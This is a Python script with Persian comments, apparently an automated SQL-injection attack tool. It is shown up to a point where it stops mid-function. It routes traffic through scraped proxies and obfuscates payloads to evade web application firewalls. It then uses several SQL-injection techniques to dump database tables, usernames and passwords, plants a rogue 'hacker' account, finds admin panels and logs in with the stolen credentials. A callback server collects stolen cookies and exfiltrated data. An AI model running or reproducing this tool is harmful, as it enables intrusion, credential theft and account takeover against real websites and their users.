import requests
from bs4 import BeautifulSoup
import urllib.parse
import time
import random
import threading
from queue import Queue
import re
import json
import base64
import hashlib
import dns.resolver
from urllib.parse import urljoin
import http.server
import socketserver
import urllib

# متغیرهای جهانی برای سرور دریافت داده‌ها
callback_data = []
server_thread = None

# تابع برای راه‌اندازی سرور داخلی برای دریافت داده‌های OOB و XSS
def start_callback_server():
    global callback_data
    callback_data = []
    PORT = 8080
    Handler = http.server.SimpleHTTPRequestHandler

    class CallbackHandler(Handler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Callback received")
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            if "cookie" in params:
                callback_data.append({"type": "XSS", "cookie": params["cookie"][0]})
            elif "data" in params:
                callback_data.append({"type": "OOB", "data": params["data"][0]})
            print(f"Received callback: {params}")

    with socketserver.TCPServer(("", PORT), CallbackHandler) as httpd:
        print(f"Callback server running on port {PORT}")
        httpd.serve_forever()

# لیست پروکسی‌ها (از منابع عمومی جمع‌آوری شده)
proxy_list = [
    {"http": "http://103.174.102.223:80", "https": "https://103.174.102.223:80"},
    {"http": "http://38.54.71.81:80", "https": "https://38.54.71.81:80"},
    {"http": "http://154.202.121.170:3128", "https": "https://154.202.121.170:3128"},
    {"http": "http://45.87.68.6:5555", "https": "https://45.87.68.6:5555"},
    {"http": "http://45.119.81.186:8080", "https": "https://45.119.81.186:8080"},
    {"http": "http://84.32.222.165:8080", "https": "https://84.32.222.165:8080"},
    {"http": "http://154.202.123.23:3128", "https": "https://154.202.123.23:3128"},
    {"http": "http://154.202.111.165:3128", "https": "https://154.202.111.165:3128"},
    {"http": "http://154.202.120.239:3128", "https": "https://154.202.120.239:3128"},
    {"http": "http://154.202.123.183:3128", "https": "https://154.202.123.183:3128"},
    {"http": "http://154.202.123.167:3128", "https": "https://154.202.123.167:3128"},
    {"http": "http://154.202.121.186:3128", "https": "https://154.202.121.186:3128"},
    {"http": "http://154.202.121.222:3128", "https": "https://154.202.121.222:3128"},
    {"http": "http://154.202.123.215:3128", "https": "https://154.202.123.215:3128"},
    {"http": "http://154.202.111.181:3128", "https": "https://154.202.111.181:3128"},
    {"http": "http://154.202.123.199:3128", "https": "https://154.202.123.199:3128"},
    {"http": "http://154.202.111.197:3128", "https": "https://154.202.111.197:3128"},
    {"http": "http://154.202.121.238:3128", "https": "https://154.202.121.238:3128"},
    {"http": "http://154.202.123.231:3128", "https": "https://154.202.123.231:3128"},
    {"http": "http://154.202.111.213:3128", "https": "https://154.202.111.213:3128"}
]

# تابع برای به‌روزرسانی پروکسی‌ها از منبع آنلاین (ProxyScrape API)
def update_proxies():
    try:
        proxy_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        response = requests.get(proxy_url, timeout=10)
        new_proxies = []
        for line in response.text.splitlines():
            if line:
                new_proxies.append({"http": f"http://{line}", "https": f"https://{line}"})
        global proxy_list
        proxy_list.extend(new_proxies)
        print(f"Updated proxy list with {len(new_proxies)} new proxies")
    except Exception as e:
        print(f"Error updating proxies: {e}")

# تابع برای تست پروکسی‌ها
def test_proxy(proxy):
    try:
        response = requests.get("http://httpbin.org/ip", proxies=proxy, timeout=5)
        if response.status_code == 200:
            return True
    except:
        return False

# فیلتر کردن پروکسی‌های فعال
working_proxies = []
update_proxies()  # به‌روزرسانی پروکسی‌ها
for proxy in proxy_list:
    if test_proxy(proxy):
        working_proxies.append(proxy)
        print(f"Proxy {proxy['http']} is working")
    else:
        print(f"Proxy {proxy['http']} is not working")

if not working_proxies:
    print("No working proxies found. Exiting...")
    exit()

# تنظیم هدرها برای جلوگیری از بلاک شدن
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://www.google.com/"
}

# امضاهای WAF برای تشخیص
waf_signatures = {
    "Cloudflare": ["cloudflare", "cf-ray"],
    "ModSecurity": ["mod_security", "403 forbidden"],
    "Incapsula": ["incapsula", "visid_incap"],
    "F5 BIG-IP": ["big-ip", "f5 networks"],
    "Imperva": ["imperva", "secureworks"],
    "Sucuri": ["sucuri", "cloudproxy"]
}

# تابع برای تشخیص WAF
def detect_waf(response):
    try:
        for waf, signatures in waf_signatures.items():
            for signature in signatures:
                if signature.lower() in response.text.lower() or signature.lower() in str(response.headers).lower():
                    return waf
        return None
    except:
        return None

# تابع برای کدگذاری payload برای عبور از WAF
def encode_payload(payload):
    try:
        encoded_payloads = [
            payload,
            urllib.parse.quote(payload),  # URL Encoding
            base64.b64encode(payload.encode()).decode(),  # Base64 Encoding
            f"/*{payload}*/",  # Comment Obfuscation
            payload.replace(" ", "/**/"),  # Space Obfuscation
            payload.replace("'", "CHAR(39)"),  # Char Encoding
            f"({payload})",  # Parentheses Obfuscation
            f"\\x{hex(ord(payload[0]))[2:]}{payload[1:]}",  # Hex Encoding for first char
            payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML Entity Encoding
            f"String.fromCharCode({','.join(str(ord(c)) for c in payload)})"  # JS CharCode (for XSS)
        ]
        return encoded_payloads
    except:
        return [payload]

# تابع برای شناسایی نوع دیتابیس
def detect_database(response_text):
    if "mysql" in response_text.lower():
        return "MySQL"
    elif "microsoft sql server" in response_text.lower():
        return "MSSQL"
    elif "oracle" in response_text.lower():
        return "Oracle"
    elif "postgresql" in response_text.lower():
        return "PostgreSQL"
    return "Unknown"

# تابع برای Crawling و پیدا کردن پنل ادمین
def find_admin_panel(url, proxy):
    common_admin_paths = [
        "/admin", "/administrator", "/wp-admin", "/login", "/adminpanel", "/cpanel", "/dashboard",
        "/admin_login", "/manage", "/controlpanel", "/adm", "/admin_area", "/backend", "/panel"
    ]
    admin_urls = []
    try:
        base_url = url.rsplit("?", 1)[0].rsplit("/", 1)[0]
        for path in common_admin_paths:
            test_url = urljoin(base_url, path)
            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
            if response.status_code in [200, 301, 302] and "login" in response.text.lower():
                admin_urls.append(test_url)
        return admin_urls
    except:
        return []

# تابع برای تست لاگین به پنل ادمین
def test_admin_login(admin_url, usernames, passwords, proxy):
    try:
        response = requests.get(admin_url, headers=headers, proxies=proxy, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', admin_url)
            action = urljoin(admin_url, action)
            method = form.get('method', 'post').lower()
            username_field = None
            password_field = None
            for input_tag in form.find_all('input'):
                name = input_tag.get('name', '').lower()
                if "user" in name or "email" in name or "login" in name:
                    username_field = input_tag.get('name')
                if "pass" in name or "pwd" in name:
                    password_field = input_tag.get('name')
            if username_field and password_field:
                for username, password in zip(usernames, passwords):
                    data = {username_field: username, password_field: password}
                    if method == 'post':
                        login_response = requests.post(action, data=data, headers=headers, proxies=proxy, allow_redirects=True, timeout=5)
                    else:
                        query = urllib.parse.urlencode(data)
                        login_response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, allow_redirects=True, timeout=5)
                    if "dashboard" in login_response.text.lower() or "logout" in login_response.text.lower() or login_response.status_code in [301, 302]:
                        return True, username, password, login_response.url
        return False, None, None, None
    except:
        return False, None, None, None

# تابع برای تست لاگین با کوکی (برای XSS)
def test_admin_login_with_cookies(admin_url, cookies, proxy):
    try:
        response = requests.get(admin_url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
        if "dashboard" in response.text.lower() or "logout" in response.text.lower() or login_response.status_code in [301, 302]:
            return True, response.url
        return False, None
    except:
        return False, None

# تابع برای شناسایی پارامترهای ورودی (URL، فرم، کوکی)
def identify_input_parameters(url, proxy):
    try:
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # شناسایی پارامتر URL
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        url_param = list(query_params.keys())[0] if query_params else None

        # شناسایی فرم‌ها
        forms = soup.find_all('form')
        form_data = None
        for form in forms:
            action = form.get('action', url)
            action = urljoin(url, action)
            method = form.get('method', 'post').lower()
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    form_data = (action, method, name)
                    break
            if form_data:
                break

        # شناسایی کوکی‌ها
        cookies = response.cookies.get_dict()
        cookie_name = list(cookies.keys())[0] if cookies else None

        # اولویت: URL > Form > Cookie
        if url_param:
            return "url", [url_param]
        elif form_data:
            return "form", form_data
        elif cookie_name:
            return "cookie", [cookie_name]
        else:
            return "url", ["id"]  # پیش‌فرض
    except:
        return "url", ["id"]

# تابع برای شناسایی تعداد ستون‌ها (برای UNION-Based SQLi)
def detect_column_count(url, input_type, input_data, proxy, db_type="MySQL"):
    try:
        max_columns = 20
        for num_cols in range(1, max_columns + 1):
            nulls = ",".join(["NULL"] * num_cols)
            payload = f"' AND 1=0 UNION SELECT {nulls}--"
            encoded_payloads = encode_payload(payload)
            for encoded_payload in encoded_payloads:
                if input_type == "url":
                    param = input_data[0]
                    test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                    response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                elif input_type == "form":
                    action, method, name = input_data
                    data = {name: encoded_payload}
                    if method == 'post':
                        response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                    else:
                        query = urllib.parse.urlencode(data)
                        response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                elif input_type == "cookie":
                    cookie_name = input_data[0]
                    cookies = {cookie_name: encoded_payload}
                    response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                if response.status_code == 200 and "error" not in response.text.lower():
                    return num_cols
        return 0
    except:
        return 0

# تابع برای استخراج جداول و ستون‌ها (برای MySQL)
def extract_tables_columns(url, input_type, input_data, proxy, db_type="MySQL"):
    try:
        tables = []
        columns = {}
        if db_type == "MySQL":
            # استخراج نام دیتابیس‌ها
            column_count = detect_column_count(url, input_type, input_data, proxy, db_type)
            if not column_count:
                return [], {}
            nulls = ",".join(["NULL"] * (column_count - 1))
            payload = f"' AND 1=0 UNION SELECT {nulls},GROUP_CONCAT(schema_name) FROM information_schema.schemata--"
            encoded_payloads = encode_payload(payload)
            for encoded_payload in encoded_payloads:
                if input_type == "url":
                    param = input_data[0]
                    test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                    response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                elif input_type == "form":
                    action, method, name = input_data
                    data = {name: encoded_payload}
                    if method == 'post':
                        response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                    else:
                        query = urllib.parse.urlencode(data)
                        response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                elif input_type == "cookie":
                    cookie_name = input_data[0]
                    cookies = {cookie_name: encoded_payload}
                    response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                if response.status_code == 200:
                    databases = re.findall(r"[\w_]+", response.text)
                    databases = [db for db in databases if db not in ["information_schema", "mysql", "performance_schema", "sys"]]
                    break

            # انتخاب دیتابیس (اولین دیتابیس غیرپیش‌فرض)
            target_db = databases[0] if databases else None
            if not target_db:
                return [], {}

            # استخراج جداول
            payload = f"' AND 1=0 UNION SELECT {nulls},GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{target_db}'--"
            encoded_payloads = encode_payload(payload)
            for encoded_payload in encoded_payloads:
                if input_type == "url":
                    param = input_data[0]
                    test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                    response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                elif input_type == "form":
                    action, method, name = input_data
                    data = {name: encoded_payload}
                    if method == 'post':
                        response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                    else:
                        query = urllib.parse.urlencode(data)
                        response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                elif input_type == "cookie":
                    cookie_name = input_data[0]
                    cookies = {cookie_name: encoded_payload}
                    response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                if response.status_code == 200:
                    tables = re.findall(r"[\w_]+", response.text)
                    break

            # استخراج ستون‌ها برای هر جدول
            for table in tables:
                payload = f"' AND 1=0 UNION SELECT {nulls},GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{target_db}'--"
                encoded_payloads = encode_payload(payload)
                for encoded_payload in encoded_payloads:
                    if input_type == "url":
                        param = input_data[0]
                        test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                        response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                    elif input_type == "form":
                        action, method, name = input_data
                        data = {name: encoded_payload}
                        if method == 'post':
                            response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                        else:
                            query = urllib.parse.urlencode(data)
                            response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                    elif input_type == "cookie":
                        cookie_name = input_data[0]
                        cookies = {cookie_name: encoded_payload}
                        response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                    if response.status_code == 200:
                        cols = re.findall(r"[\w_]+", response.text)
                        columns[table] = cols
                        break
        return tables, columns
    except:
        return [], {}

# تابع برای استخراج داده‌ها (برای MySQL)
def extract_data(url, input_type, input_data, tables, columns, proxy, db_type="MySQL"):
    extracted_data = {}
    try:
        column_count = detect_column_count(url, input_type, input_data, proxy, db_type)
        if not column_count:
            return extracted_data
        nulls = ",".join(["NULL"] * (column_count - 1))
        if db_type == "MySQL":
            for table in tables:
                # پیدا کردن ستون‌های حساس
                username_col = None
                password_col = None
                email_col = None
                for col in columns.get(table, []):
                    col_lower = col.lower()
                    if any(keyword in col_lower for keyword in ["user", "name", "login", "usr", "account"]):
                        username_col = col
                    if any(keyword in col_lower for keyword in ["pass", "pwd", "password", "hash", "secret"]):
                        password_col = col
                    if any(keyword in col_lower for keyword in ["email", "mail", "contact"]):
                        email_col = col
                if username_col and password_col:
                    payload = f"' AND 1=0 UNION SELECT {nulls},GROUP_CONCAT({username_col},':',{password_col}) FROM {table}--"
                    encoded_payloads = encode_payload(payload)
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                        if response.status_code == 200:
                            data = re.findall(r"[\w@._-]+:[\w@._-]+", response.text)
                            extracted_data[table] = [(entry.split(":")[0], entry.split(":")[1]) for entry in data if ":" in entry]
                            break
                elif email_col:
                    payload = f"' AND 1=0 UNION SELECT {nulls},GROUP_CONCAT({email_col}) FROM {table}--"
                    encoded_payloads = encode_payload(payload)
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                        if response.status_code == 200:
                            data = re.findall(r"[\w@._-]+", response.text)
                            extracted_data[table] = [(email, None) for email in data]
                            break
        return extracted_data
    except:
        return extracted_data

# تابع برای اکسپلویت In-Band و UNION-Based SQLi
def exploit_inband_union(url, sqli_type, proxy):
    try:
        input_type, input_data = identify_input_parameters(url, proxy)

        # شناسایی دیتابیس
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        db_type = detect_database(response.text)
        print(f"Detected Database: {db_type} for {url}")

        # استخراج جداول و ستون‌ها
        tables, columns = extract_tables_columns(url, input_type, input_data, proxy, db_type)
        if not tables:
            return None, None, []

        # استخراج داده‌ها
        extracted_data = extract_data(url, input_type, input_data, tables, columns, proxy, db_type)
        if not extracted_data:
            return None, None, []

        # پیدا کردن پنل ادمین
        admin_urls = find_admin_panel(url, proxy)
        usernames = []
        passwords = []
        for table, data in extracted_data.items():
            for username, password in data:
                if username and password:
                    usernames.append(username)
                    passwords.append(password)

        # تست لاگین به پنل ادمین
        admin_access = []
        for admin_url in admin_urls:
            success, username, password, redirect_url = test_admin_login(admin_url, usernames, passwords, proxy)
            if success:
                admin_access.append((admin_url, username, password, redirect_url))

        return extracted_data, admin_access, tables
    except Exception as e:
        print(f"Error exploiting {url}: {e}")
        return None, None, []

# تابع برای اکسپلویت Time-Based و Boolean-Based SQLi
def exploit_time_boolean(url, sqli_type, proxy):
    try:
        input_type, input_data = identify_input_parameters(url, proxy)

        # شناسایی دیتابیس
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        db_type = detect_database(response.text)
        print(f"Detected Database: {db_type} for {url}")

        # برای Time-Based و Boolean-Based، از روش باینری برای استخراج داده استفاده می‌کنیم
        extracted_data = {}
        tables, columns = extract_tables_columns(url, input_type, input_data, proxy, db_type)
        if not tables:
            return None, None, []

        table_name = tables[0]  # اولین جدول
        username_col = None
        password_col = None
        for col in columns.get(table_name, []):
            col_lower = col.lower()
            if any(keyword in col_lower for keyword in ["user", "name", "login", "usr", "account"]):
                username_col = col
            if any(keyword in col_lower for keyword in ["pass", "pwd", "password", "hash", "secret"]):
                password_col = col
        if not (username_col and password_col):
            return None, None, []

        usernames = []
        passwords = []

        # تست تعداد رکوردها
        payload_template = f"' AND IF((SELECT COUNT(*) FROM {table_name})>{{pos}},SLEEP(5),0)--"
        count = 0
        for i in range(100):  # حداکثر ۱۰۰ رکورد
            payload = payload_template.format(pos=i)
            encoded_payloads = encode_payload(payload)
            for encoded_payload in encoded_payloads:
                if input_type == "url":
                    param = input_data[0]
                    test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                    start_time = time.time()
                    response = requests.get(test_url, headers=headers, proxies=proxy, timeout=10)
                    end_time = time.time()
                elif input_type == "form":
                    action, method, name = input_data
                    data = {name: encoded_payload}
                    start_time = time.time()
                    if method == 'post':
                        response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=10)
                    else:
                        query = urllib.parse.urlencode(data)
                        response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=10)
                    end_time = time.time()
                elif input_type == "cookie":
                    cookie_name = input_data[0]
                    cookies = {cookie_name: encoded_payload}
                    start_time = time.time()
                    response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=10)
                    end_time = time.time()
                if end_time - start_time < 5:
                    count = i
                    break

        # استخراج داده‌ها
        for i in range(count):
            username = ""
            password = ""
            # استخراج username
            for pos in range(1, 50):  # حداکثر طول ۵۰ کاراکتر
                for char in range(32, 127):  # کاراکترهای ASCII
                    payload = f"' AND IF(ASCII(SUBSTRING((SELECT {username_col} FROM {table_name} LIMIT {i},1),{pos},1))={char},SLEEP(5),0)--"
                    encoded_payloads = encode_payload(payload)
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            start_time = time.time()
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=10)
                            end_time = time.time()
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            start_time = time.time()
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=10)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=10)
                            end_time = time.time()
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            start_time = time.time()
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=10)
                            end_time = time.time()
                        if end_time - start_time >= 5:
                            username += chr(char)
                            break
                if not username:
                    break
            # استخراج password
            for pos in range(1, 50):
                for char in range(32, 127):
                    payload = f"' AND IF(ASCII(SUBSTRING((SELECT {password_col} FROM {table_name} LIMIT {i},1),{pos},1))={char},SLEEP(5),0)--"
                    encoded_payloads = encode_payload(payload)
                    for encoded_payload in encoded_payloads:
                        if input_type == "url":
                            param = input_data[0]
                            test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                            start_time = time.time()
                            response = requests.get(test_url, headers=headers, proxies=proxy, timeout=10)
                            end_time = time.time()
                        elif input_type == "form":
                            action, method, name = input_data
                            data = {name: encoded_payload}
                            start_time = time.time()
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=10)
                            else:
                                query = urllib.parse.urlencode(data)
                                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=10)
                            end_time = time.time()
                        elif input_type == "cookie":
                            cookie_name = input_data[0]
                            cookies = {cookie_name: encoded_payload}
                            start_time = time.time()
                            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=10)
                            end_time = time.time()
                        if end_time - start_time >= 5:
                            password += chr(char)
                            break
                if not password:
                    break
            if username and password:
                usernames.append(username)
                passwords.append(password)

        extracted_data = {table_name: list(zip(usernames, passwords))}
        admin_urls = find_admin_panel(url, proxy)
        admin_access = []
        for admin_url in admin_urls:
            success, username, password, redirect_url = test_admin_login(admin_url, usernames, passwords, proxy)
            if success:
                admin_access.append((admin_url, username, password, redirect_url))

        return extracted_data, admin_access, [table_name]
    except Exception as e:
        print(f"Error exploiting {url}: {e}")
        return None, None, []

# تابع برای اکسپلویت Error-Based SQLi
def exploit_error_based(url, sqli_type, proxy):
    try:
        input_type, input_data = identify_input_parameters(url, proxy)

        # شناسایی دیتابیس
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        db_type = detect_database(response.text)
        print(f"Detected Database: {db_type} for {url}")

        # استخراج جداول و ستون‌ها با استفاده از خطاها
        tables = []
        columns = {}
        if db_type == "MySQL":
            payload = "' AND 1=CONVERT(int,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()))--"
            encoded_payloads = encode_payload(payload)
            for encoded_payload in encoded_payloads:
                if input_type == "url":
                    param = input_data[0]
                    test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                    response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                elif input_type == "form":
                    action, method, name = input_data
                    data = {name: encoded_payload}
                    if method == 'post':
                        response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                    else:
                        query = urllib.parse.urlencode(data)
                        response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                elif input_type == "cookie":
                    cookie_name = input_data[0]
                    cookies = {cookie_name: encoded_payload}
                    response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                if "error" in response.text.lower():
                    tables_match = re.search(r"(\w+,)*\w+", response.text)
                    if tables_match:
                        tables = tables_match.group(0).split(",")
                        break

            for table in tables:
                payload = f"' AND 1=CONVERT(int,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'))--"
                encoded_payloads = encode_payload(payload)
                for encoded_payload in encoded_payloads:
                    if input_type == "url":
                        param = input_data[0]
                        test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                        response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
                    elif input_type == "form":
                        action, method, name = input_data
                        data = {name: encoded_payload}
                        if method == 'post':
                            response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                        else:
                            query = urllib.parse.urlencode(data)
                            response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
                    elif input_type == "cookie":
                        cookie_name = input_data[0]
                        cookies = {cookie_name: encoded_payload}
                        response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)
                    if "error" in response.text.lower():
                        columns_match = re.search(r"(\w+,)*\w+", response.text)
                        if columns_match:
                            columns[table] = columns_match.group(0).split(",")
                            break

        # استخراج داده‌ها
        extracted_data = extract_data(url, input_type, input_data, tables, columns, proxy, db_type)
        if not extracted_data:
            return None, None, []

        admin_urls = find_admin_panel(url, proxy)
        usernames = []
        passwords = []
        for table, data in extracted_data.items():
            for username, password in data:
                if username and password:
                    usernames.append(username)
                    passwords.append(password)

        admin_access = []
        for admin_url in admin_urls:
            success, username, password, redirect_url = test_admin_login(admin_url, usernames, passwords, proxy)
            if success:
                admin_access.append((admin_url, username, password, redirect_url))

        return extracted_data, admin_access, tables
    except Exception as e:
        print(f"Error exploiting {url}: {e}")
        return None, None, []

# تابع برای اکسپلویت Second-Order SQLi
def exploit_second_order(url, sqli_type, proxy):
    try:
        input_type, input_data = identify_input_parameters(url, proxy)
        if input_type != "form":
            return None, None, []  # Second-Order معمولاً تو فرم‌ها تست می‌شه

        # شناسایی دیتابیس
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        db_type = detect_database(response.text)
        print(f"Detected Database: {db_type} for {url}")

        # تست Second-Order با تزریق و بررسی نتایج
        tables, columns = extract_tables_columns(url, input_type, input_data, proxy, db_type)
        if not tables:
            return None, None, []

        table_name = tables[0]
        username_col = None
        password_col = None
        for col in columns.get(table_name, []):
            col_lower = col.lower()
            if any(keyword in col_lower for keyword in ["user", "name", "login", "usr", "account"]):
                username_col = col
            if any(keyword in col_lower for keyword in ["pass", "pwd", "password", "hash", "secret"]):
                password_col = col
        if not (username_col and password_col):
            return None, None, []

        action, method, name = input_data
        payload = f"'; INSERT INTO {table_name} ({username_col}, {password_col}) VALUES ('hacker','hacked')--"
        encoded_payloads = encode_payload(payload)
        for encoded_payload in encoded_payloads:
            data = {name: encoded_payload}
            if method == 'post':
                response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
            else:
                query = urllib.parse.urlencode(data)
                response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)

        # حالا داده‌های واردشده رو استخراج می‌کنیم
        extracted_data = extract_data(url, input_type, input_data, tables, columns, proxy, db_type)
        if not extracted_data:
            extracted_data = {table_name: [("hacker", "hacked")]}

        admin_urls = find_admin_panel(url, proxy)
        usernames = []
        passwords = []
        for table, data in extracted_data.items():
            for username, password in data:
                if username and password:
                    usernames.append(username)
                    passwords.append(password)

        admin_access = []
        for admin_url in admin_urls:
            success, username, password, redirect_url = test_admin_login(admin_url, usernames, passwords, proxy)
            if success:
                admin_access.append((admin_url, username, password, redirect_url))

        return extracted_data, admin_access, tables
    except Exception as e:
        print(f"Error exploiting {url}: {e}")
        return None, None, []

# تابع برای اکسپلویت Out-of-Band SQLi
def exploit_out_of_band(url, sqli_type, proxy):
    try:
        input_type, input_data = identify_input_parameters(url, proxy)

        # شناسایی دیتابیس
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        db_type = detect_database(response.text)
        print(f"Detected Database: {db_type} for {url}")

        column_count = detect_column_count(url, input_type, input_data, proxy, db_type)
        if not column_count:
            return None, None, []

        nulls = ",".join(["NULL"] * (column_count - 1))
        unique_id = hashlib.md5(url.encode()).hexdigest()
        callback_url = f"http://localhost:8080/oob?data="
        payload = f"' AND 1=0 UNION SELECT {nulls},LOAD_FILE(CONCAT('{callback_url}',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())))--"
        encoded_payloads = encode_payload(payload)
        for encoded_payload in encoded_payloads:
            if input_type == "url":
                param = input_data[0]
                test_url = url.replace(f"{param}={urllib.parse.parse_qs(urllib.parse.urlparse(url).query)[param][0]}", f"{param}={encoded_payload}")
                response = requests.get(test_url, headers=headers, proxies=proxy, timeout=5)
            elif input_type == "form":
                action, method, name = input_data
                data = {name: encoded_payload}
                if method == 'post':
                    response = requests.post(action, data=data, headers=headers, proxies=proxy, timeout=5)
                else:
                    query = urllib.parse.urlencode(data)
                    response = requests.get(f"{action}?{query}", headers=headers, proxies=proxy, timeout=5)
            elif input_type == "cookie":
                cookie_name = input_data[0]
                cookies = {cookie_name: encoded_payload}
                response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy, timeout=5)

        # منتظر داده‌ها از سرور داخلی
        time.sleep(5)
        oob_data = []
